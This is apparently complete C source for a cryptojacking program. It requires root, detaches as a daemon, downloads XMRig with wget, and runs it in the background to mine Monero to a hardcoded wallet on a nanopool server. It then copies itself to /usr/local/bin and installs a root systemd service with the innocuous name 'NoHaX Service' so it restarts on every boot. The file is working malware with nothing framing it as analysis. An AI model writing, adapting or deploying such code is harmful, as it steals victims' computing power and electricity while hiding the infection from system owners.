#include <stdio.h>
#include <stdlib.h>
#include <sys/syslog.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

void check_root() {
    if (getuid() != 0) {
        printf("Root permission required\n");
        exit(1);
    }
}

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    setsid();
    if (chdir("/") < 0) {
        syslog(LOG_ERR, "chdir failed");
        exit(errno);
    }
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    int fd0 = open("/dev/null", O_RDWR);
    int fd1 = dup(0);
    int fd2 = dup(0);
    openlog("nohax", LOG_CONS | LOG_PID, LOG_DAEMON);
    if (fd0 != 0 || fd1 != 1 || fd2 != 2) {
        syslog(LOG_ERR, "fd error");
        exit(errno);
    }
}

void download_and_run_xmrig() {
    syslog(LOG_INFO, "downloading...");
    if (chdir("/tmp") != 0) {
        syslog(LOG_ERR, "cd /tmp failed");
        return;
    }
    int status = system("wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -O xmrig.tar.gz");
    if (status != 0) {
        syslog(LOG_ERR, "wget failed");
        return;
    }
    syslog(LOG_INFO, "downloaded");

    status = system("tar -xzf xmrig.tar.gz");
    if (status != 0) {
        syslog(LOG_ERR, "extract failed");
        return;
    }
    syslog(LOG_INFO, "extracted");

    pid_t pid = fork();
    if (pid == 0) {
        int fd = open("/tmp/xmrig.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd < 0) {
            syslog(LOG_ERR, "log open failed");
            exit(1);
        }
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        close(fd);
        status = system("nohup ./xmrig-6.22.2/xmrig --donate-level 1 --coin monero -o xmr-asia1.nanopool.org:10343 -u 47oiyRPtfmg4YK4ggJnCHHB2XmMK31NXKiwDAfnGZczMYGgQM7cJRa6jLC9M2hK81jTLze5vTPcrjFb93T5nkREfUHSsYky -k --tls 2>&1 | tee -a /tmp/xmrig.log >/dev/null &");
        if (status == 0) {
            syslog(LOG_INFO, "running");
        }
        exit(1);
    } else if (pid > 0) {
        syslog(LOG_INFO, "forked");
    } else {
        syslog(LOG_ERR, "fork failed");
    }
    if (status == 0) {
        syslog(LOG_INFO, "started");
    } else {
        syslog(LOG_ERR, "failed");
    }
}

void persistent() {
    const char *target_path = "/usr/local/bin/nohaxd";
    char current_path[4096];
    ssize_t len = readlink("/proc/self/exe", current_path, sizeof(current_path) - 1);
    if (len == -1) {
        syslog(LOG_ERR, "readlink failed");
        return;
    }
    current_path[len] = '\0';

    char command[8192];
    snprintf(command, sizeof(command), "cp %s %s", current_path, target_path);
    system(command);

    FILE *service = fopen("/etc/systemd/system/nohaxd.service", "w");
    fprintf(service,
        "[Unit]\n"
        "Description=NoHaX Service\n"
        "After=network.target\n\n"
        "[Service]\n"
        "ExecStart=%s\n"
        "Restart=always\n"
        "User=root\n"
        "StandardOutput=null\n"
        "StandardError=null\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n", target_path);
    fclose(service);

    system("systemctl daemon-reload");
    system("systemctl enable nohaxd.service");
    system("systemctl start nohaxd.service");
}

int main() {
    check_root();
    daemonize();
    download_and_run_xmrig();
    persistent();
    return 0;
}
